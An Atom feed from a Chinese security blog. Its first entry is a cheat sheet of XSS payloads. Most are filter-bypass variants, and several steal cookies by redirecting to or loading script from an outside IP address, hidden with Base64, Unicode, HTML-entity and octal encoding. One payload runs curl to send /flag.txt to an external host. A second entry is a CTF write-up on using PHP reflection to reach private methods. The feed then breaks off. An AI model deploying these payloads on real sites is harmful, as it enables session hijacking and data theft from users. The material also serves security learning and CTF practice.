<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>LJH&#39;s blog</title>
  
  <subtitle>LJH&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://museljh.github.io/"/>
  <updated>2019-04-24T07:27:20.670Z</updated>
  <id>https://museljh.github.io/</id>
  
  <author>
    <name>LJH&#39;s blog</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xss小结</title>
    <link href="https://museljh.github.io/2019/04/24/xss%E5%B0%8F%E7%BB%93/"/>
    <id>https://museljh.github.io/2019/04/24/xss小结/</id>
    <published>2019-04-24T07:24:20.000Z</published>
    <updated>2019-04-24T07:27:20.670Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS语句"><a href="#XSS语句" class="headerlink" title="XSS语句"></a>XSS语句</h2><h2 id="反射XSS语句"><a href="#反射XSS语句" class="headerlink" title="反射XSS语句"></a>反射XSS语句</h2><p>1.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onfocus=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure></p><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>3.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>4.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onfocus=alert(/xss/) autofocus&gt;</span><br></pre></td></tr></table></figure><p>5.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=top.alert(1)&gt;</span><br></pre></td></tr></table></figure><p>6.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=top[&apos;prompt&apos;](1)&gt;</span><br></pre></td></tr></table></figure><p>7.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(‘alert(1)’) &gt;</span><br></pre></td></tr></table></figure><p>8.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=&quot;&lt;img src=x:x onerror=alert(1)&gt;&quot; /&gt;</span><br></pre></td></tr></table></figure><p>9.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(atob(&apos;YWxlcnQoMSk=&apos;)) &gt;</span><br></pre></td></tr></table></figure><p>10.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(&apos;\141\154\145\162\164\50\61\51&apos;) &gt;</span><br></pre></td></tr></table></figure><p>11.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) &gt;</span><br></pre></td></tr></table></figure><p>12.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(&quot;appendChild(createElement(&apos;script&apos;)).src=&apos;http://120.77.176.168:11122&apos;&quot;) &gt;</span><br></pre></td></tr></table></figure><p>13.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=window.alert(1) &gt;</span><br></pre></td></tr></table></figure><p>14.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=window[&apos;eva&apos;+&apos;l&apos;](alert(1)) &gt;</span><br></pre></td></tr></table></figure><p>15.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=_=alert,_(/xss/) &gt;</span><br></pre></td></tr></table></figure><p>16.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=_=&apos;e&apos;+&apos;val&apos;,_(alert(1)) &gt;</span><br></pre></td></tr></table></figure><p>17.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=location=&apos;javascri&apos;.concat(&apos;pt:aler&apos;,&apos;t(1)&apos;)&gt;</span><br></pre></td></tr></table></figure><p>18.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=location=[&apos;java&apos;,&apos;script:&apos;,&apos;alert(1)&apos;].join(&quot;&quot;)&gt;</span><br></pre></td></tr></table></figure><p>19.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) &gt;</span><br></pre></td></tr></table></figure><p>20.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=setTimeout(&apos;\141\154\145\162\164\50\61\51&apos;)&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS窃取cookie"><a href="#XSS窃取cookie" class="headerlink" title="XSS窃取cookie"></a>XSS窃取cookie</h2><p>1.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=&quot;javascript:document.location=&apos;http://120.77.176.168:11122&apos;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>2.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=1 onerror=&quot;javascript:document.location=&apos;http://120.77.176.168:11122&apos;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>3.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=location=&apos;javascri&apos;.concat(&quot;pt:document&quot;,&quot;.location=&quot;,&quot;&apos;http://120.77.176.168:11122&apos;&quot;)&gt;</span><br></pre></td></tr></table></figure><p>4.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://120.77.176.1&apos;.concat(&apos;68:111&apos;,&apos;22&apos;); &gt;</span><br></pre></td></tr></table></figure><p>5.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://120.77.176.1&apos;.\u0063oncat(&apos;68:111&apos;,&apos;22&apos;); &gt;</span><br></pre></td></tr></table></figure><p>6.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=location=[&quot;java&quot;,&quot;script:&quot;,&quot;document.location=&quot;,&quot;&apos;http://120.77.176.168:11122&apos;&quot;].join(&quot;&quot;)&gt;</span><br></pre></td></tr></table></figure><p>7.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,67,114,73,112,116,32,115,114,67,61,39,104,116,116,112,58,47,47,49,50,48,46,55,55,46,49,55,54,46,49,54,56,58,49,49,49,50,50,39,62,60,47,115,67,82,105,112,84,62)) &gt;</span><br></pre></td></tr></table></figure><p>8.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=setTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&quot;)&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS窃取cookie-变形"><a href="#XSS窃取cookie-变形" class="headerlink" title="XSS窃取cookie 变形"></a>XSS窃取cookie 变形</h2><h3 id="HTML编码绕过"><a href="#HTML编码绕过" class="headerlink" title="HTML编码绕过"></a>HTML编码绕过</h3><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=&quot;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x6C;&amp;#x6F;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6F;&amp;#x6E;&amp;#x3D;&apos;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x31;&amp;#x32;&amp;#x30;&amp;#x2E;&amp;#x37;&amp;#x37;&amp;#x2E;&amp;#x31;&amp;#x37;&amp;#x36;&amp;#x2E;&amp;#x31;&amp;#x36;&amp;#x38;&amp;#x3A;&amp;#x31;&amp;#x31;&amp;#x31;&amp;#x32;&amp;#x32;&apos;&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="unicode编码绕过"><a href="#unicode编码绕过" class="headerlink" title="unicode编码绕过"></a>unicode编码绕过</h3><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(&apos;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&apos;) &gt;</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=\u0073etTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&quot;)&gt;</span><br></pre></td></tr></table></figure><h3 id="Base64编码绕过"><a href="#Base64编码绕过" class="headerlink" title="Base64编码绕过"></a>Base64编码绕过</h3><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(atob(&apos;amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw==&apos;)) &gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=1 onerror=eval(atob(&apos;amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw==&apos;))&gt;</span><br></pre></td></tr></table></figure><h3 id="js8编码绕过"><a href="#js8编码绕过" class="headerlink" title="js8编码绕过"></a>js8编码绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(&apos;\152\141\166\141\163\143\162\151\160\164\72\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\61\62\60\56\67\67\56\61\67\66\56\61\66\70\72\61\61\61\62\62\47&apos;) &gt;</span><br></pre></td></tr></table></figure><h3 id="混合编码绕过"><a href="#混合编码绕过" class="headerlink" title="混合编码绕过"></a>混合编码绕过</h3><p>1.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=\u0065val(atob(&apos;amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw==&apos;)) &gt;</span><br></pre></td></tr></table></figure></p><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=window[&apos;eva&apos;+&apos;l&apos;](&apos;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&apos;) &gt;</span><br></pre></td></tr></table></figure><h2 id="xss-POST-amp-GET请求"><a href="#xss-POST-amp-GET请求" class="headerlink" title="xss POST&amp;GET请求"></a>xss POST&amp;GET请求</h2><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;fetch(&apos;exec.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;command=&apos;+encodeURIComponent(&apos;curl xss.zsxsoft.com:23457 -F&quot;a=@/flag.txt&quot;&apos;)+&apos;&amp;exec=1&apos;&#125;).then(p=&gt;p.text()).then(p=&gt;fetch(&apos;main.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;comment=&apos;+p&#125;))&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>2.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=&quot;&lt;script&gt;fetch(&apos;exec.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;command=&apos;+encodeURIComponent(&apos;&apos;)&#125;).then(p=&gt;p.text()).then(p=&gt;fetch(&apos;main.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;comment=&apos;+p&#125;))&lt;/script&gt; &quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/176185" target="_blank" rel="noopener">测试WAF来学习XSS姿势</a></p><p><a href="https://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a></p>]]></content>
    
    <summary type="html">
    
      使用PHP反射性质修改PHP函数，属性等
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="xss" scheme="https://museljh.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>ctf中的php反射</title>
    <link href="https://museljh.github.io/2019/04/24/ctf%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/"/>
    <id>https://museljh.github.io/2019/04/24/ctf中的php反射/</id>
    <published>2019-04-24T07:20:07.000Z</published>
    <updated>2019-04-24T07:26:27.751Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在2019CISCN中有这么一道题目需要我们通过PHP反射机制调用私有函数最终得到Flag，感觉十分神奇于是来探究下。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><blockquote><p>反射通常被定义为程序在执行时检查自身并修改其逻辑的能力。在技术方面，反射是要求对象告诉你它的属性和方法，并改变那些成员（甚至是私有成员）。</p></blockquote><p>在如上对于反射的定义我们不难发现通过反射我们能够修改一个程序逻辑包括属性、方法。并且不仅仅能够改变Public成员，甚至能够改变Private成员，可以说是一种十分实用的特性，我将结合2019CISCN题目来对对其进行分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!defined(&apos;LFI&apos;)) &#123;</span><br><span class="line">    echo &quot;Include me!&quot;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">use interesting\FlagSDK;</span><br><span class="line">$sdk = new FlagSDK();</span><br><span class="line">$key = $_GET[&apos;key&apos;] ?? false;</span><br><span class="line">if (!$key) &#123;</span><br><span class="line">    echo &quot;Please provide access key&lt;br \&gt;&quot;;</span><br><span class="line">    echo &apos;$_GET[&quot;key&quot;];&apos;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$flag = $sdk-&gt;verify($key);</span><br><span class="line">if ($flag) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;Wrong Key&quot;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚看到这题的时候我们队开始时是想通过<figure class="highlight plain"><figcaption><span>error:  Call to private method FlagSDK::getHash() from context```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">猜测题目应该是这样的：</span><br></pre></td></tr></table></figure></p><p>class FlagSDK {</p><p>public function verify($key)<br>{</p><p> if (sha1($key) === $this-&gt;getHash()) {</p><p>   return “too{young-too-simple}”;<br>    }<br>  return false;<br>}</p><p>Private function getHash()<br>{</p><pre><code>return &apos;xxxxx&apos;;</code></pre><p>}</p><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在&lt;a href=&apos;https://www.php.net/manual/zh/book.reflection.php&apos;&gt;PHP手册中&lt;/a&gt;我们能够发现很多有趣的函数，</span><br><span class="line"></span><br><span class="line">一、 反射读取私有成员</span><br></pre></td></tr></table></figure></p><p>&lt;?php<br>        //Enter your code here, enjoy!<br> class FlagSDK {<br>   private $hash=’xxxx’;<br>}<br>$sdk = new FlagSDK();<br>$reflect = new ReflectionClass($sdk);</p><p>##var_dump($sdk-&gt;getHash());<br>$props   = $reflect-&gt;getProperties(ReflectionProperty::IS_PUBLIC | ReflectionProperty::IS_PRIVATE | ReflectionProperty::IS_PROTECTED);<br>foreach ($props as $prop) {<br>    $prop-&gt;setAccessible(true);<br>    print $prop-&gt;getName() . “\t”;<br>    print $prop-&gt;getValue($sdk).”\n”;<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过如上的构造，我们成功得到FlagSDK类的Private成员属性```hashxxxx</span><br></pre></td></tr></table></figure></p><p>二、 反射执行私有方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        //Enter your code here, enjoy!</span><br><span class="line">class FlagSDK &#123;</span><br><span class="line">private $hash=&apos;xxxx&apos;;</span><br><span class="line">public function verify($key)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> if (sha1($key) === $this-&gt;getHash()) &#123;</span><br><span class="line"></span><br><span class="line">   return &quot;too&#123;young-too-simple&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private function getHash()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    return &apos;xxxxx&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    $hash=new FlagSDK();</span><br><span class="line">    $objReflectClass = new ReflectionClass(&apos;FlagSDK&apos;);</span><br><span class="line">    $method = $objReflectClass-&gt;getMethod(&apos;getHash&apos;);</span><br><span class="line">    $method-&gt;setAccessible(true);</span><br><span class="line">    $re=$method-&gt;invokeArgs($hash,array());</span><br><span class="line">    echo $re;</span><br></pre></td></tr></table></figure><p>通过如上的构造，我们成功得到getHash的返回值</p><p>三、 反射重构变量</p><p>1.公有变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        //Enter your code here, enjoy!</span><br><span class="line">class FlagSDK &#123;</span><br><span class="line">public $hash=&apos;xxxx&apos;;</span><br><span class="line">public function verify($key)</span><br><span class="line">&#123;</span><br><span class="line"> if (sha1($key) === $this-&gt;getHash()) &#123;</span><br><span class="line">   return &quot;Its&apos;s a flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line">private function getHash()</span><br><span class="line">&#123;</span><br><span class="line">    return &apos;xxxxx&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$FlagSDK = new FlagSDK;</span><br><span class="line">$reflectionClass = new ReflectionClass(&apos;FlagSDK&apos;);</span><br><span class="line">$reflectionClass-&gt;getProperty(&apos;hash&apos;)-&gt;setValue($FlagSDK,&apos;aaaa&apos;);</span><br><span class="line">var_dump($FlagSDK-&gt;hash);</span><br></pre></td></tr></table></figure><p>可以看到<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2.私有变量</span><br></pre></td></tr></table></figure></p><p>&lt;?php<br>        //Enter your code here, enjoy!<br>class FlagSDK {<br>private $hash=’xxxx’;<br>public function verify($key)<br>{<br> if (sha1($key) === $this-&gt;getHash()) {<br>   return “Its’s a flag”;<br>    }<br>  return false;<br>}<br>private function getHash()<br>{<br>    return ‘xxxxx’;<br>}<br>}<br>$FlagSDK = new FlagSDK;<br>$reflectionClass = new ReflectionClass(‘FlagSDK’);<br>$reflectionProperty = $reflectionClass-&gt;getProperty(‘hash’);<br>$reflectionProperty-&gt;setAccessible(true);<br>$reflectionProperty-&gt;setValue($FlagSDK, ‘aaaa’);<br>var_dump($reflectionProperty-&gt;getValue($FlagSDK));<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">可以看到```$hash```成功被我们修改为aaaa</span><br><span class="line"></span><br><span class="line">四、 反射重构方法</span><br><span class="line"></span><br><span class="line">~~依赖注入newInstanceWithoutConstructor~~</span><br><span class="line"></span><br><span class="line">1.修改public方法返回值</span><br><span class="line"></span><br><span class="line">2.修改private方法返回值</span><br><span class="line"></span><br><span class="line">通过添加命名空间来控制函数、函数调用会先调用本命名空间中的同名函数（比如设置了一个interesting的命名空间假如调用sha1函数，就会先调用interesting/sha1而不是/sha1</span><br></pre></td></tr></table></figure></p><p>&lt;?php<br>namespace interesting;<br>function sha1($var) { // 调用类的私有、保护方法<br>    $class = new \ReflectionClass(‘interesting\FlagSDK’);<br>    $method = $class-&gt;getMethod(‘getHash’);<br>    $method-&gt;setAccessible(true);<br>    $instance = $class-&gt;newInstance();<br>    return $method-&gt;invoke($instance);<br>}</p><p>class FlagSDK {<br>protected  $flagPath;</p><p>public function verify($key)<br>{<br> if (sha1($key) === $this-&gt;getHash()) {<br>   return “Its’s a flag”;<br>    }<br>  return false;<br>}<br>private function getHash()<br>{<br>    return ‘xxxxx’;<br>}<br>}<br>$a =new FlagSDK();<br>$b=$a-&gt;verify(‘1’);<br>echo $b;</p><p>?&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过伪造sha1函数，成功返回flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">后来寻思着想不能能通过依赖注入的方式注入一个类到```$flagPath```变量中，这里有我只是提供个思路具体行不行我也不知道：1.修改```$flagPath``` 也就是```/var/www/html/flag.txt```，改成我们能够控制的路径文件进行解密，不过我对于加密解密不是很了解就不往深处想了。2.~~依赖注入一个类使得这个类直接调用~~（好吧其实是多次一举，我上面已经说可以直接修改了```$flagPath```变量了，也不用整个依赖注入。</span><br></pre></td></tr></table></figure></p><p>&lt;?php<br>        //Enter your code here, enjoy!<br>class dep {</p><p>}<br>class FlagSDK {<br>protected  $flagPath;<br>public function verify($key)<br>{<br> if (sha1($key) === $this-&gt;getHash()) {<br>   return “Its’s a flag”;<br>    }<br>  return false;<br>}<br>public function getHash()<br>{<br>    return ‘xxxxx’;<br>}<br>}</p><p>$ref = new ReflectionClass(‘FlagSDK’);<br>$inst = $ref-&gt;newInstanceWithoutConstructor();<br>$list = $ref-&gt;getProperties();<br>foreach($list as $prop){<br>  /<em> @var $prop ReflectionProperty </em>/<br>  $prop-&gt;getDocComment(); //grep for @inject and the @vars class name<br>  $prop-&gt;setAccessible(true);<br>  $prop-&gt;setValue($inst, new dep());<br>}<br>if($const = $ref-&gt;getConstructor()) {<br>  $constName = $const-&gt;getName();<br>  $inst-&gt;{$constName}(); //use call_user_func_array($function, $param_arr); for arguments<br>}</p><p>print_r($inst);<br>print_r($inst-&gt;verify(‘1’)); //property still not accessable<br><code>`</code></p><p>这样我们就可以注入一个dep类到<code>$flagPath</code>中了（实际上貌似没有啥用。</p><p>五、其他</p><p>当然通过反射我们能够实现很多其他有趣的东西，具体的化可以看PHP手册。</p>]]></content>
    
    <summary type="html">
    
      使用PHP反射性质修改PHP函数，属性等
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="php" scheme="https://museljh.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>bypass disable function的学习与实践</title>
    <link href="https://museljh.github.io/2019/03/29/bypass%20disable%20function%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
    <id>https://museljh.github.io/2019/03/29/bypass disable function的学习与实践/</id>
    <published>2019-03-29T06:24:01.000Z</published>
    <updated>2019-03-29T06:36:36.091Z</updated>
    
